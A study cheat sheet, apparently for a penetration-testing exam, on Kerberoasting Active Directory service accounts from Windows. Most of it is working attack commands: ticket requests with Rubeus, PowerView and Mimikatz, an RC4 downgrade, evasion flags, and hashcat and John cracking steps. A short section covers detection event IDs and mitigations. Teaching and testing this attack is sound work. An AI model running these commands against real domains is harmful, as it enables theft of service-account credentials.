# Section 18 — Kerberoasting from Windows

---

## QUICK REFERENCE — Three Methods

### Method 1 — Rubeus (Fastest, Recommended)
```powershell
cd C:\Tools

# Stats only (no tickets requested)
.\Rubeus.exe kerberoast /stats

# High-value targets only (admincount=1)
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# All tickets
.\Rubeus.exe kerberoast /nowrap

# Single user
.\Rubeus.exe kerberoast /user:SAPService /nowrap

# Force RC4 (downgrade from AES — not on Server 2019)
.\Rubeus.exe kerberoast /tgtdeleg /nowrap
.\Rubeus.exe kerberoast /rc4opsec /nowrap    # filters out AES-only accounts
```

### Method 2 — PowerView (Clean Hashcat-ready output)
```powershell
Import-Module .\PowerView.ps1

# List SPN accounts
Get-DomainUser * -spn | select samaccountname

# Single user ticket
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# All tickets → CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
cat .\ilfreight_tgs.csv
```

### Method 3 — Semi-Manual (setspn + Mimikatz)
```powershell
# Enumerate SPNs
setspn.exe -Q */*

# Request ticket into memory
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Extract with Mimikatz
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

---

## Cracking

```bash
# RC4 (type 23) — most common, fast
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt

# AES-256 (type 18) — slower, ~23 min vs 4 sec on CPU
hashcat -m 19700 hash.txt /usr/share/wordlists/rockyou.txt

# John fallback
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## Encryption Type Reference

| msDS-SupportedEncryptionTypes | Value | Meaning |
|-------------------------------|-------|---------|
| 0 | Default | RC4_HMAC_MD5 (etype 23) |
| 8 | AES-128 only | |
| 16 | AES-256 only | |
| 24 | AES-128 + AES-256 | Harder to crack |

```powershell
# Check encryption type for an account
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

**Hash prefix tells you what you have:**
- `$krb5tgs$23$*` = RC4 → Hashcat mode 13100 → fast
- `$krb5tgs$18$*` = AES-256 → Hashcat mode 19700 → slow

---

## RC4 Downgrade (/tgtdeleg)

```powershell
.\Rubeus.exe kerberoast /user:TARGET /tgtdeleg /nowrap
# Forces RC4 ticket even if account supports AES
# Does NOT work against Windows Server 2019 DCs — will return AES regardless
```

**Speed difference:** RC4 cracks in ~4 sec on CPU | AES-256 takes ~23 min on CPU

---

## Rubeus Key Flags

| Flag | Effect |
|------|--------|
| `/stats` | Show stats only — no ticket requests |
| `/nowrap` | No line wrapping — copy-paste friendly for Hashcat |
| `/ldapfilter:'admincount=1'` | Target only high-value accounts |
| `/user:TARGET` | Single account |
| `/tgtdeleg` | Force RC4 downgrade (not on Server 2019) |
| `/rc4opsec` | Filter out AES-only accounts, request RC4 only |
| `/outfile:hashes.txt` | Save to file |
| `/delay:5000 /jitter:30` | Slow down requests (evasion) |

---

## Semi-Manual Method — Full Chain

```powershell
# 1. Enumerate SPNs with setspn
setspn.exe -Q */*
# Focus on CN=<user accounts>, ignore computer accounts

# 2. Request ticket into memory (single SPN)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# 3. Request all tickets at once
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

```
# 4. Extract from memory with Mimikatz (base64 to avoid file write)
mimikatz # base64 /out:true
mimikatz # kerberos::list /export

# 5. On Linux — clean up base64 and convert
echo "<base64 blob>" | tr -d \\n > encoded_file
cat encoded_file | base64 -d > sqldev.kirbi

# 6. Convert .kirbi to hashcat format
python2.7 kirbi2john.py sqldev.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# 7. Crack
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

**Shortcut:** Run `mimikatz # kerberos::list /export` without base64 → writes .kirbi files to disk → run kirbi2john directly, skip the base64 steps.

---

## Detection & Mitigation

**Detection:**
| Event ID | Meaning |
|----------|---------|
| 4769 | Kerberos service ticket requested |
| 4770 | Kerberos service ticket renewed |

Many 4769s from one account in a short window = Kerberoasting indicator. Ticket encryption type `0x17` (hex 23) = RC4 requested = likely attack.

**Mitigations:**
- Use **Managed Service Accounts (MSA)** or **Group Managed Service Accounts (gMSA)** — auto-rotate complex passwords
- Long passphrases on any SPN account that can't use MSA/gMSA
- Never put SPN accounts in Domain Admins
- Restrict RC4 (test carefully — can break things)
- Monitor Event ID 4769 for spikes

---

## Exam Notes

- Rubeus `/ldapfilter:'admincount=1'` = target DA-adjacent accounts first
- `/nowrap` always — makes hash copy-paste ready for Hashcat
- `/tgtdeleg` forces RC4 downgrade (huge speed gain) — doesn't work on Server 2019
- RC4 cracks in seconds; AES-256 takes minutes on CPU, much longer on strong passwords
- PowerView `Export-Csv` = cleanest method for bulk offline processing
- Semi-manual method useful when Rubeus is blocked — uses native PS + Mimikatz
- `msDS-SupportedEncryptionTypes = 0` = RC4 default | `24` = AES only
- Check `/stats` first to understand the target landscape before requesting tickets
- Tool location: `C:\Tools\`
